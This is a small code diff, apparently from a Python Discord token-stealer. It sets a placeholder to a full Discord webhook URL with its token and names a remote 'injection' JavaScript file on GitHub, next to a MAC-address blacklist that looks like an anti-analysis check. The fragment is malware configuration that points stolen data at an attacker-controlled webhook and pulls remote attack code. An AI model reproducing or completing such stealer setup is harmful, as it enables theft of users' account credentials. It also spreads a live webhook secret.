@@ -49,7 +49,7 @@ if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
 
 
 
-wh00k = "WEBHOOK HERE"
+wh00k = "https://ptb.discord.com/api/webhooks/1092501355274453002/Ts99akKn-nz4oqOBYUV_CipkDOndfbp1SW7P1P9rwA7HPUyu22i3TZW7MK1KRJTE0boU"
 inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
     
 DETECTED = False
